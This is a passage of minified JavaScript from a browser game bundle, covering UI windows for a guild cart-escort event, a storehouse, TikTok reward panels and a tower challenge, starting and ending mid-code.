o=m.CrossDartCarCT.ins().getGuildCarState(t),s=m.CrossDartCarCT.ins().getGuildCarStateStr(o,t);this.lb_state.textFlow=TextFlowMakerEntry.generateTextFlow(s)},e.prototype.updateTime=function(){this.leftTime=Math.ceil(.001*(m.CrossDartCarCT.ins().arriveTime-c.GameServerCC.serverTime)),Timer.has(this.flusLeftTime,this)||Timer.start(1e3,-1,this.flusLeftTime,this),this.flusLeftTime()},e.prototype.updateCost=function(){var t=a.GlobalConfig.GuildEscortCartBaseConfig.tranItem;this.cost.setData(t,!1)},e.prototype.updateRedPoint=function(){this.btnDesc.eRp&&(this.btnDesc.eRp.visible=m.CrossDartCarCT.ins().bolLogChange)},e.prototype.updateBaseItemList=function(){this.clearCarLine();var t=a.GlobalConfig.GuildEscortCartLineConfig,e=m.CrossDartCarCT.ins().dartCarInfoList,i=[];for(var n in t){var o=t[n],s={x:o.endpoint[0],y:o.endpoint[1]},r=new y.CrossDartCarMapItem;this.mapItemGrp.addChild(r),r.x=s.x,r.y=s.y,r.data=o,this.baseItemArr.push(r);for(var l=[this.startPos],h=0,u=o.controPoint;h<u.length;h++){var p=u[h],d=new egret.Point(p[0],p[1]);l.push(d)}l.push(s),i[n]=this.createBezierLine(l,o)}for(var c=0,f=e;c<f.length;c++){var g=f[c],l=i[g.line];l&&this.moveCarToTarget(l,g.startTime,g)}i.length=0},e.prototype.calculateBezierPoints=function(t){for(var e=[],i=[],n=0;100>=n;n++){for(var o=n/100,s=0,a=0,r=t.length-1,l=0;r>=l;l++){var h=this.binomialCoefficient(r,l),u=Math.pow(1-o,r-l)*Math.pow(o,l);s+=h*u*t[l].x,a+=h*u*t[l].y}i.push(new egret.Point(s,a))}for(var p=0,d=[0],n=1;n<i.length;n++)p+=egret.Point.distance(i[n],i[n-1]),d.push(p);for(var c=p/99,n=0;100>=n;n++)for(var f=n*c,l=1;l<d.length;l++)if(d[l]>=f){var o=(f-d[l-1])/(d[l]-d[l-1]),s=i[l-1].x+o*(i[l].x-i[l-1].x),a=i[l-1].y+o*(i[l].y-i[l-1].y);e.push(new egret.Point(s,a));break}return e},e.prototype.binomialCoefficient=function(t,e){for(var i=1,n=1;e>=n;n++)i*=(t-(e-n))/n;return i},e.prototype.setCarPositionAtTime=function(t,e,i){var n=Math.floor(e/this.maxTime*i.length);0>n&&(n=0),n>=i.length&&(n=i.length-1),t.x=i[n].x,t.y=i[n].y;for(var o=(1e3*(this.maxTime-e),1e3*this.maxTime/i.length),s=egret.Tween.get(t),a=n;a<i.length;a++)s=s.to({x:i[a].x,y:i[a].y},o)},e.prototype.createBezierLine=function(t,e){var i=this.calculateBezierPoints(t),n=i.length,o=[],s=0;if(e&&e.terrainRange)for(var a=0;a<e.terrainRange.length;a++){var r=e.terrainRange[a];o[a]={range:r[0],idx:r[1]*n*.01+s},s+=r[1]*n*.01}var l=new egret.Shape;this.lineGrp.addChild(l);var h=l.graphics,u=1,p=0,d=o[p]?o[p].idx:n,c=o[p]?o[p].range:0,f=m.CrossDartCarCT.ins().getRoadColor(c),g=f;h.lineStyle(2,f,u,!1,"normal",egret.CapsStyle.ROUND,egret.JointStyle.MITER,0,[5,15]),h.moveTo(i[0].x,i[0].y);for(var a=1;n>a;a++)a>=d&&(p++,d=o[p]?o[p].idx:n,c=o[p]?o[p].range:c,g=m.CrossDartCarCT.ins().getRoadColor(c)),g!==f&&(h.lineStyle(2,g,u,!1,"normal",egret.CapsStyle.ROUND,egret.JointStyle.MITER,0,[5,15]),f=g),h.lineTo(i[a].x,i[a].y);return this.lineList.push(l),i},e.prototype.moveCarToTarget=function(t,e,i){var n;i&&a.GlobalConfig.GuildEscortCartLineConfig[i.line]&&(n=a.GlobalConfig.GuildEscortCartLineConfig[i.line]);var o=new v.CrossDartCarItem;o.data=i,this.carItemGrp.addChild(o),this.carItemList.push(o),e=e?e:c.GameServerCC.serverTime;var s=Math.ceil((c.GameServerCC.serverTime-e)/1e3);s=s>this.maxTime?this.maxTime:s,this.setCarPositionAtTime(o,s,t)},e.prototype.eSscrollVH=function(){this.eSc.viewport.validateNow();var t=(this.eSc.viewport.contentWidth||this.contentGroup.width)-this.eSc.viewport.width,e=this.startPos.x-this.eSc.viewport.width/2,i=e>t?t:e;0>i&&(i=0),this.eSc.viewport.scrollH=i;var n=(this.eSc.viewport.contentHeight||this.contentGroup.height)-this.eSc.viewport.height,o=this.startPos.y-this.eSc.viewport.height/2,s=o>n?n:o;0>s&&(s=0),this.eSc.viewport.scrollV=s},e.prototype.onClick=function(t){var i;switch(t.currentTarget){case this.eCloseBtn:win.close(this);break;case this.btnDesc:if(e.bolTestDraw)return console.log("测试发车  ",this.tempTarList),void this.createBezierLine(this.tempTarList);win.open(b.CrossDartCarWin);break;case this.btnStart:m.CrossDartCarCT.ins().startSendCar();break;case this.btnHelp:if(e.bolTestDraw)return console.log("删除测试发车线路"),this.tempTarList=[],void this.clearCarLine();win.open(u.CommonHelpWin,(null===(i=a.GlobalConfig.HelpInfoConfig[333])||void 0===i?void 0:i.text)||"");break;case this.btnBuy:g.WarnCT.ins().setBuyGoodsWarn(r.ItemConst.CROSSDART_TRAN_ITEM);break;case this.goGrp:win.open(C.CrossDartCarMsgWin);break;case this.rewardShow:win.open(T.CrossDartCarRewardWin)}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=d.OpenSystem.ins().checkSysOpen(l.SystemType.CrossDartCar);return i||f.TipsCT.ins().showTips(d.OpenSystem.ins().getNoOpenTips(l.SystemType.CrossDartCar)),m.CrossDartCarCT.ins().checkInActTime(!0)?i:void 0},e.prototype.flusLeftTime=function(){this.leftTime--,this.leftTime<=0?this.lb_activeTime.text="-":this.lb_activeTime.text=n.DateUtils.getFormatBySecond(this.leftTime,n.DateUtils.TIME_FORMAT_1);for(var t=0;t<this.carItemList.length;t++){var e=this.carItemList[t];if(e){var i=e.checkInRunningTime();i||(e.carInfo&&e.carInfo.guildId==p.Guild.ins().guildID&&this.sendMsgInfo(),egret.Tween.removeTweens(e),o.DisplayUtils.removeFromParent(e),this.carItemList.splice(t,1),t--)}}},e.prototype.clearCarLine=function(){for(var t=0,e=this.baseItemArr;t<e.length;t++){var i=e[t];o.DisplayUtils.removeFromParent(i)}this.baseItemArr=[];for(var n=0,s=this.lineList;n<s.length;n++){var i=s[n];o.DisplayUtils.removeFromParent(i)}this.lineList=[];for(var a=0,r=this.carItemList;a<r.length;a++){var i=r[a];egret.Tween.removeTweens(i),o.DisplayUtils.removeFromParent(i)}this.carItemList=[]},e.prototype.removeDisplay=function(){Timer.stop(this.flusLeftTime,this),this.skin&&(this.removeObserve(),this.clearCarLine(),this.startItem&&(o.DisplayUtils.removeFromParent(this.startItem),this.startItem=null))},e.prototype.onMapClick=function(t){var e,i=this.eG.globalToLocal(Math.ceil(t.stageX),Math.ceil(t.stageY));0==this.tempTarList.length&&this.tempTarList.push(this.startPos),e=new egret.Shape,e.graphics.beginFill(65535),e.graphics.drawRect(i.x-10,i.y-10,20,20),e.graphics.endFill(),this.eG.addChild(e),this.lineList.push(e),this.tempTarList.push(i)},e.bolTestDraw=!1,__decorate([delayCall(100)],e.prototype,"eSscrollVH",null),e}(s.BaseView);e.CrossDartCarMapWin=w,window.CrossDartCarMapWin=w,__reflect(w.prototype,"CrossDartCarMapWin",[]),window.CrossDartCarMapWin=w},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarItem=void 0;var n=i(21),o=i(18),s=i(3),a=i(0),r=i(7),l=i(68),h=i(246),u=function(t){function e(){var e=t.call(this)||this;return e._sn_="CrossDartCarItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.addTouchEvent(this,this.onClick)},e.prototype.dataChanged=function(){if(this.carInfo=this.data,this.carInfo){this.lb_guildName.text=this.carInfo.guildName;var t=l.CrossDartCarCT.ins().getCarLuckObj(this.carInfo.luck);t&&(this.lb_guildName.textColor=o.ColorUtil.stringToNumber(t[1]),this.icon.source=t[2]),this.lb_loseTips.visible=this.carInfo.tranT>0,this.playEff(this.carInfo.bolAtked)}},e.prototype.onClick=function(t){win.open(h.CrossDartCarWarnWin,this.data)},e.prototype.checkInRunningTime=function(){return this.data?this.data.arriveTime>r.GameServerCC.serverTime:!1},e.prototype.playEff=function(t){if(void 0===t&&(t=!0),t){this.mcFight||(this.mcFight=new n.MovieClip,this.effGrp.addChild(this.mcFight));var e=a.GlobalConfig.GuildEscortCartBaseConfig.mcBattle;this.mcFight.playFile(RES_DIR_EFF+e,-1)}else this.mcFight&&(removeFromParent(this.mcFight),this.mcFight=null)},e}(s.BaseItemRender);e.CrossDartCarItem=u,window.CrossDartCarItem=u,__reflect(u.prototype,"CrossDartCarItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarMapItem=void 0;var n=i(3),o=function(t){function e(){var e=t.call(this)||this;return e._sn_="CrossDartCarMapItemSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){if(this.dataChanged(),this.data){var t=this.data,e=t.buildImg,i=t.buildName;this.lb_name.text=i?i:"",this.icon.source=e?e:""}},e.prototype.dataChanged=function(){},e}(n.BaseItemRender);e.CrossDartCarMapItem=o,window.CrossDartCarMapItem=o,__reflect(o.prototype,"CrossDartCarMapItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarMsgWin=void 0;var n=i(1),o=i(68),s=i(371),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="CrossDartCarMsgSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onTap),this.observe(o.CrossDartCarCT.ins().postGetTrantInfo,this.updateData),this.list_msg.itemRenderer=s.CrossDartCarMsgItem,this.list_msg.dataProvider=this.eArc=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.updateData(),o.CrossDartCarCT.ins().sendGetTrantInfo()},e.prototype.updateData=function(){this.eArc.replaceAll(o.CrossDartCarCT.ins().dartCarInfoList),this.lb_empty.visible=!(o.CrossDartCarCT.ins().dartCarInfoList&&o.CrossDartCarCT.ins().dartCarInfoList.length)},e.prototype.onTap=function(t){switch(t.target){case this.closeBtn:win.close(this)}},e}(n.BaseView);e.CrossDartCarMsgWin=a,window.CrossDartCarMsgWin=a,__reflect(a.prototype,"CrossDartCarMsgWin",[]),window.CrossDartCarMsgWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarMsgItem=void 0;var n=i(18),o=i(8),s=i(3),a=i(0),r=i(7),l=i(68),h=i(246),u=function(t){function e(){var e=t.call(this)||this;return e.leftTime=0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.dataChanged(),this.addTouchEvent(this.btnGo,this.onClick),Timer.has(this.flusLeftTime,this)||Timer.start(1e3,-1,this.flusLeftTime,this)},e.prototype.dataChanged=function(){if(this.carInfo=this.data,this.carInfo){this.lb_name.text=this.carInfo.guildName;var t=a.GlobalConfig.GuildEscortCartBaseConfig.disTime;this.leftTime=t-Math.ceil((r.GameServerCC.serverTime-this.carInfo.startTime)/1e3),this.lb_luckyVal.text=.01*this.carInfo.luck+"%";var e=l.CrossDartCarCT.ins().getCarLuckObj(this.carInfo.luck);e&&(this.lb_luckyVal.textColor=n.ColorUtil.stringToNumber(e[1])),this.lb_state.textColor=this.carInfo.tranT?n.ColorUtil.RED_COLOR_N:n.ColorUtil.GREEN_COLOR_N,this.carInfo.tranT?this.lb_state.text=gettext("被劫毁"):this.lb_state.text=this.carInfo.bolAtked?gettext("被攻击中"):gettext("行驶中");var i=a.GlobalConfig.GuildEscortCartBaseConfig.carTranT,o=i-this.carInfo.tranTimes;this.lb_times.text=o.toString(),this.flusLeftTime()}},e.prototype.onClick=function(t){win.open(h.CrossDartCarWarnWin,this.data)},e.prototype.flusLeftTime=function(){this.leftTime--,this.leftTime<=0?this.lb_leftTime.text="-":this.lb_leftTime.text=o.DateUtils.getFormatBySecond(this.leftTime,o.DateUtils.TIME_FORMAT_1);var t=l.CrossDartCarCT.ins().getAddition(this.carInfo);this.lb_addVal.text=t+"%"},e}(s.BaseItemRender);e.CrossDartCarMsgItem=u,window.CrossDartCarMsgItem=u,__reflect(u.prototype,"CrossDartCarMsgItem",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarRewardWin=void 0;var n=i(1),o=i(77),s=i(0),a=function(t){function e(){var e=t.call(this)||this;return e._sn_="CrossDartRewardSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.baseRewardList.itemRenderer=o.ItemBaseNoName,this.winRewardList.itemRenderer=o.ItemBaseNoName,this.addTouchEvent(this.closeBtn,this.onTap)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];var i=s.GlobalConfig.GuildEscortCartBaseConfig.participationRewards;this.baseRewardList.dataProvider=new eui.ArrayCollection(i);var n=s.GlobalConfig.GuildEscortCartBaseConfig.victoryRewards;this.winRewardList.dataProvider=new eui.ArrayCollection(n);var o=s.GlobalConfig.GuildEscortCartBaseConfig.interceptRate;this.lb_tips.text=gettext("根据镖车货物，劫镖人均摊{0}%的奖励",.01*o)},e.prototype.onTap=function(t){win.close(this)},e}(n.BaseView);e.CrossDartCarRewardWin=a,window.CrossDartCarRewardWin=a,__reflect(a.prototype,"CrossDartCarRewardWin",[]),window.CrossDartCarRewardWin=a},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CrossDartCarWin=void 0;var n=i(1),o=i(68),s=function(t){function e(){var e=t.call(this)||this;return e._sn_="CrossDartCarSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEvent(this,this.onClick)},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this.observe(o.CrossDartCarCT.ins().postRedChange,this.updateTabRp)},e.prototype.updateTabRp=function(){this.eTab.updateReds()},e.prototype.onClick=function(t){switch(t.target){case this.closeBtn:win.close(this)}},e.openCheck=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];return!0},e}(n.BaseView);e.CrossDartCarWin=s,window.CrossDartCarWin=s,__reflect(s.prototype,"CrossDartCarWin",[]),window.CrossDartCarWin=s},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DemonCirData=void 0;var n=function(){function t(t){this.parser(t)}return t.prototype.parser=function(t){this.id=t.readByte(),this.level=t.readInt(),this.exp=t.readInt(),this.talentLv=t.readByte();var e=t.readByte();this.specialVals=[];for(var i=0;e>i;i++){for(var n=[],o=t.readByte(),s=0;o>s;s++)n.push({type:t.readByte(),param:t.readInt(),value:t.readInt()});this.specialVals.push(n)}},t.prototype.getActiveByIndex=function(t){if(!this.specialVals||this.specialVals.length<=t)return!1;var e=this.specialVals[t];if(!e||!e.length)return!1;for(var i=e.length,n=0;i>n;n++)if(-1==e[n].value)return!1;return!0},t}();e.DemonCirData=n,window.DemonCirData=n,__reflect(n.prototype,"DemonCirData",[]),window.DemonCirData=n},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DCSkillItemCell=void 0;var n=i(0),o=i(49),s=i(155),a=i(843),r=i(844),l=function(t){function e(){var e=t.call(this)||this;return e.touchChildren=!1,e.touchEnabled=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){this.inited=!0,this.update()},e.prototype.setData=function(t){this.data=t,this.inited&&this.update()
},e.prototype.update=function(){if(this.data){if(this.dcImg.source=null,this.data.type==e.TYPE_TALENT)this.dcImg.source=n.GlobalConfig.DemonCirBase[this.data.id].talentImg;else if(this.data.type==e.TYPE_TEZHI&&n.GlobalConfig.DemonCirTeZhi[this.data.id]){var t=n.GlobalConfig.DemonCirTeZhi[this.data.id][this.data.actived?this.data.param:1];this.dcImg.source=null===t||void 0===t?void 0:t.icon}this.dcImg.filters=this.data.actived?null:o.FilterUtil.ARRAY_GRAY_FILTER,this.redPoint.visible=!1,this.hasEventListener(egret.TouchEvent.REMOVED_FROM_STAGE)||this.addEventListener(egret.TouchEvent.REMOVED_FROM_STAGE,this.onRmove,this),this.hasEventListener(egret.TouchEvent.TOUCH_TAP)||this.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),this.updateRed()}},e.prototype.updateRed=function(){this.data&&this.skin&&this.data.type==e.TYPE_TALENT&&(this.redPoint.visible=!!s.DemonCirRedPoint.ins().zhenYanPoints[this.data.roleId][this.data.id])},e.prototype.onRmove=function(t){this.removeEventListener(egret.TouchEvent.REMOVED_FROM_STAGE,this.onRmove,this),this.removeEventListener(egret.TouchEvent.TOUCH_TAP,this.onTouch,this),this.data=null},e.prototype.onTouch=function(t){this.data&&(this.data.type==e.TYPE_TALENT?win.open(r.DCAbilityTipsWin,this.data.roleId,this.data.id,this.data.actived):this.data.type==e.TYPE_TEZHI&&win.open(a.DCTeZhiTipsWin,{id:this.data.id,level:this.data.param,actived:this.data.actived,demonID:this.demonID,demonLvl:this.demonLvl}))},e.TYPE_TALENT=0,e.TYPE_TEZHI=1,e}(eui.Component);e.DCSkillItemCell=l,window.DCSkillItemCell=l,__reflect(l.prototype,"DCSkillItemCell",[]),window.DCSkillItemCell=l},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateCityItem=void 0;var n=i(3),o=i(0),s=i(78),a=i(232),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DominateCityItemSkin",e.cityIdx=0,e.type=1,e.isDef=!1,e.lv=1,e}return __extends(e,t),e.prototype.skinComplete=function(){this.addTouchEndEvent(this,this.openDetail),this.setDatas()},e.prototype.dataChanged=function(){},e.prototype.setDatas=function(){var t=o.GlobalConfig.DominationBtLvCfg,e=s.DominateWorldCT.ins().returnWorldIdInfo(this.cityIdx);if(e){var i=e.lv,n=e.idx;this.cityName.text=t[i].townName[n]||"",this.GuildName.text=e.dataArr.name+(e.dataArr.server>0?"[S"+e.dataArr.server+"]":"")||gettext("无"),this.cityIcon.source="dominate_building"+(n%4+1)}else this.cityName.text=t[this.lv].townName[this.cityIdx],this.cityIcon.source="dominate_building"+(this.cityIdx%4+1),this.GuildName.text=gettext("无")},e.prototype.openDetail=function(){console.error("点击了城市~"+this.cityIdx+this.isDef),this.isDef?win.open(a.DominateWorldCityDesc,1,{lv:this.lv,cityName:this.cityName.text,type:this.type}):s.DominateWorldCT.ins().sendDominateWorldDesc(this.cityIdx)},e.prototype.clearAll=function(){this.cityName.text="",this.GuildName.text="",this.cityIcon.source="",this.removeTouchEvent(this,this.openDetail)},e}(n.BaseItemRender);e.DominateCityItem=r,window.DominateCityItem=r,__reflect(r.prototype,"DominateCityItem",[]),window.DominateCityItem=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DominateNameItem=void 0;var n=i(3),o=function(t){function e(){return null!==t&&t.apply(this,arguments)||this}return __extends(e,t),e.prototype.dataChanged=function(){this.labelDisplay.text=""+(this.data||"")},e}(n.BaseItemRender);e.DominateNameItem=o,window.DominateNameItem=o,__reflect(o.prototype,"DominateNameItem",[]),window.DominateNameItem=o},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DyDesktopAddWin=void 0;var n=i(1),o=i(0),s=i(247),a=i(116),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DesktopAddSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.buildList0.itemRenderer=s.DYSidebarItem,this._curCostArr1=new eui.ArrayCollection,this.buildList0.dataProvider=this._curCostArr1},e.prototype.addDisplay=function(){this.addTouchEvent(this,this.onTap),observe(this,this.setData,a.TikTokCT.ins().updateAwardData),this.setData()},e.prototype.removeDisplay=function(){this.removeObserve()},e.prototype.setData=function(){var t=o.GlobalConfig.DyEntranceRewardCfg;if(t){var e=2,i=[];for(var n in t)if(+n==e){var s=t[n];for(var r in s)i.push(s[r])}this._curCostArr1.replaceAll(i),this.buildList0.validateNow();var l=a.TikTokCT.ins().TikTokNowArr[e];l&&(this.day.text=gettext("已累积登录第{0}天",l.day||0))}},e.prototype.onTap=function(t){switch(t.target){case this.add:platform.getTikTokSidebar(),win.close(this);break;case this.close:win.close(this)}},e}(n.BaseView);e.DyDesktopAddWin=r,window.DyDesktopAddWin=r,__reflect(r.prototype,"DyDesktopAddWin",[]),window.DyDesktopAddWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DYSidebarWin=void 0;var n=i(1),o=i(0),s=i(247),a=i(116),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="sidebarSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.buildList0.itemRenderer=s.DYSidebarItem,this._curCostArr1=new eui.ArrayCollection,this.buildList0.dataProvider=this._curCostArr1},e.prototype.addDisplay=function(){this.addTouchEvent(this,this.onTap),observe(this,this.setData,a.TikTokCT.ins().updateAwardData),this.setData()},e.prototype.removeDisplay=function(){this.removeObserve()},e.prototype.setData=function(){var t=o.GlobalConfig.DyEntranceRewardCfg;if(t){var e=1,i=[];for(var n in t)if(+n==e){var s=t[n];for(var r in s)i.push(s[r])}this._curCostArr1.replaceAll(i),this.buildList0.validateNow();var l=a.TikTokCT.ins().TikTokNowArr[e];l&&(this.day.text=gettext("已累积登录第{0}天",l.day||0))}},e.prototype.onTap=function(t){switch(t.target){case this.jump:platform.getTikTokSidebar(),win.close(this);break;case this.close:win.close(this)}},e}(n.BaseView);e.DYSidebarWin=r,window.DYSidebarWin=r,__reflect(r.prototype,"DYSidebarWin",[]),window.DYSidebarWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.DyGameConcernWin=void 0;var n=i(1),o=i(11),s=i(0),a=i(116),r=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="DyGameAwardSkin",e.defaultRect=!0,e}return __extends(e,t),e.prototype.skinComplete=function(){},e.prototype.addDisplay=function(){this.addTouchEvent(this.btnReward,this.onClick),this.baseRewardList.itemRenderer=o.ItemBase,this.baseRewardList.dataProvider=this.sData=new eui.ArrayCollection,observe(this,this.close,a.TikTokCT.ins().updateTikTokConcernState),this.updateData()},e.prototype.close=function(){win.close(this)},e.prototype.updateData=function(){var t=s.GlobalConfig.XiaoChengXuReward;t?(this.sData.replaceAll(t.tikTokFollowAwards),2==urlParam.isTikTokConcern&&0==a.TikTokCT.ins().isConcernGet?(this.btnReward.label=gettext("领取奖励"),this.btnReward.enabled=!0):1==urlParam.isTikTokConcern&&0==a.TikTokCT.ins().isConcernGet?(this.btnReward.label=gettext("打开关注"),this.btnReward.enabled=!0):1==a.TikTokCT.ins().isConcernGet&&(this.btnReward.label=gettext("已领取奖励"),this.btnReward.enabled=!1)):this.btnReward.enabled=!1},e.prototype.onClick=function(){2==urlParam.isTikTokConcern&&0==a.TikTokCT.ins().isConcernGet?(a.TikTokCT.ins().getTikTokConcern(),console.log("领取奖励~")):(platform.setTikTokGameForConcern(),this.close())},e}(n.BaseView);e.DyGameConcernWin=r,window.DyGameConcernWin=r,__reflect(r.prototype,"DyGameConcernWin",[]),window.DyGameConcernWin=r},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.CastingSelEquipWin=void 0;var n=i(1),o=i(0),s=i(6),a=i(153),r=i(862),l=function(t){function e(){var e=t.call(this)||this;return e._sn_="CastingSelEquipSkin",e}return __extends(e,t),e.prototype.skinComplete=function(){this.listItem.itemRenderer=r.CastingEquipMaterialItem,this.listItem.dataProvider=this._equipArr=new eui.ArrayCollection},e.prototype.addDisplay=function(){for(var t=[],e=0;e<arguments.length;e++)t[e]=arguments[e];this._type=t[0],this.btnSure.addEventListener(egret.TouchEvent.TOUCH_TAP,this.onClickHandler,this),this.listItem.addEventListener(eui.ItemTapEvent.ITEM_TAP,this.itemClick,this),this.observe(s.BagCT.ins().postItemDel,this.flusList),this.flusList()},e.prototype.flusList=function(){var t;a.CastingData.ins.selCastingMaterialEquip=null;var e=[];if(2==this._type)e=a.CastingData.ins.getMaterialEquipArr();else if(1==this._type){var i=o.GlobalConfig.EquipCastingConfig[null===(t=a.CastingData.ins.selCastingEquip)||void 0===t?void 0:t.star],n=null===i||void 0===i?void 0:i.castingSheetRate,r=[];if(n)for(var l in n)r.push(+l);for(var h=0,u=r;h<u.length;h++){var p=u[h],d=s.BagCT.ins().getBagGoodsByTypeAndId(s.BagCT.BAG_TYPE_OTHTER,p);d&&e.push(d)}}this._equipArr.source=e,this._equipArr.refresh()},e.prototype.itemClick=function(t){var e,i=this.listItem.selectedItem;i.handle!=(null===(e=a.CastingData.ins.selCastingMaterialEquip)||void 0===e?void 0:e.handle)&&(a.CastingData.ins.selCastingMaterialEquip=i,this._equipArr.refresh())},e.prototype.onClickHandler=function(t){a.CastingData.ins.selCastingMaterialEquip&&a.CastingData.ins.postSelMaterialEquipChange(),win.close(this)},e}(n.BaseView);e.CastingSelEquipWin=l,window.CastingSelEquipWin=l,__reflect(l.prototype,"CastingSelEquipWin",[])},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.StoreHouseCT=void 0;var n=i(24),o=i(286),s=i(14),a=i(0),r=i(57),l=i(6),h=function(t){function e(){var e=t.call(this)||this;return e.openNum=0,e.sysId=PackageID.Bag,e.regNetMsg(30,e.patchBagNum),e}return __extends(e,t),e.ins=function(){return t.ins.call(this)},e.prototype.patchBagNum=function(t){this.openNum=t.readInt()},e.prototype.sendExpandStoreHouse=function(t){var e=this.getBytes(30);e.writeInt(t),this.sendToServer(e)},e.prototype.sendStoreOrTakeOut=function(t,e){var i=this.getBytes(31);i.writeByte(t),i.writeDouble(e),this.sendToServer(i)},e.prototype.sendTidyStoreHouse=function(){var t=this.getBytes(32);this.sendToServer(t)},e.prototype.getItemsByType=function(t){var e=l.BagCT.ins().getBagItemsByType(l.BagCT.BAG_TYPE_STORE)||[];if(!(e.length<=0)){for(var i=[],n=0,s=e;n<s.length;n++){var a=s[n],h=a.itemConfig;if(t==r.STORE_SUB_TYPE.All||h.descIndex==t){var u=o.ObjectUtils.deepClone(a);i.push(u)}}return i}},e.prototype.getMaxNum=function(){var t=a.GlobalConfig.ItemHouseBaseConfig.baseSize||0,e=n.CommonUtils.getObjectLength(a.GlobalConfig.ItemHouseExpandConfig)||0;return t+e},e.prototype.getBuyNum=function(){var t=a.GlobalConfig.ItemHouseBaseConfig.baseSize,e=this.openNum-t;return e>0?e:0},e.prototype.getOpenNum=function(){return this.openNum},e.prototype.getLockNum=function(){return this.getMaxNum()-this.getOpenNum()},e.prototype.getEmptyNum=function(){var t=e.ins().getItemsByType(r.STORE_SUB_TYPE.All)||[],i=this.getOpenNum()-t.length;return i>0?i:0},e.prototype.getOpenCost=function(){var t=this.getBuyNum(),e=t+1,i=n.CommonUtils.getObjectLength(a.GlobalConfig.ItemHouseExpandConfig)||0;e>i&&(e=i);var o=a.GlobalConfig.ItemHouseExpandConfig[e];return o?o.cost:0},e.prototype.isMax=function(){return this.getEmptyNum()<=0},__decorate([post()],e.prototype,"patchBagNum",null),e}(s.BaseSystem);e.StoreHouseCT=h,window.StoreHouseCT=h,__reflect(h.prototype,"StoreHouseCT",[]),Systemap.StoreHouseCT=function(){return h.ins()},window.StoreHouseCT=h},function(t,e,i){"use strict";Object.defineProperty(e,"__esModule",{value:!0}),e.FBChallengePanel=void 0;var n=i(5),o=i(1),s=i(0),a=i(11),r=i(4),l=i(10),h=i(88),u=i(71),p=i(2),d=i(26),c=i(54),f=i(92),g=i(882),m=function(t){function e(){var e=null!==t&&t.apply(this,arguments)||this;return e._sn_="chuangtianguan",e}return __extends(e,t),e.prototype.skinComplete=function(){this.list.itemRenderer=g.SkyItemRenderer,this.iconList.itemRenderer=a.ItemBase,this.addTouchEvent(this.challengeBtn,this.challenge),this.addTouchEvent(this.challengeBtn0,this.getDayRewward),this.addTouchEvent(this.jump,this.onClick),this.addTouchEvent(this.choujiang,this.lotto),this.addTouchEvent(this.btnC,this.onClick)},e.prototype.addDisplay=function(){this.refushPanelInfo(),observe(this,this.updateReward,c.Fb2CT.ins().postGetReward),observe(this,this.initRanking,h.Rank.ins().postRankingData),observe(this,this.updateRedPointStyle,c.Fb2CT.ins().postUpDataInfo),h.Rank.ins().sendGetRankingData(u.RankDataType.TYPE_COPY),this.updateRedPoint(),this.showRewwardLabel(),this.eDailtGroup.visible=!urlParam.isShenhe},e.prototype.updateRedPointStyle=function(){this.redPoint0.visible=f.SkyLevelModel.ins().cruLevel>1&&1==f.SkyLevelModel.ins().dayReward,this.redPoint1.visible=f.SkyLevelModel.ins().lotteryRemainTimes>0,this.updateTowerState()},e.prototype.lotto=function(t){0==f.SkyLevelModel.ins().cruLevel&&0==f.SkyLevelModel.ins().rewardTimes?p.TipsCT.ins().showTips(gettext("已全部通关")):win.open("BabelLotteryWin")},e.prototype.updateReward=function(){this.showRewwardLabel()},e.prototype.initRanking=function(t){if(t.type==u.RankDataType.TYPE_COPY){this.rankModel=t;for(var e=t.getDataList(),i=1;3>=i;i++){var o=e[i-1];if(o){this["name"+(i-1)].text=o.player;var a=s.GlobalConfig.FbChallengeConfig[o.count];this["num"+(i-1)].text=gettext("{0}重天{1}层",a.group,a.layer)}else this["rankImg"+(i-1)].visible=this["name"+(i-1)].visible=this["num"+(i-1)].visible=!1}var r=this.jump.text;this.jump.textFlow=n.TextFlowMaker.generateTextFlow1("|U:&T:"+r)}},e.prototype.refushPanelInfo=function(){var t=f.SkyLevelModel.ins().getSkyLevelList();this.list.dataProvider=new 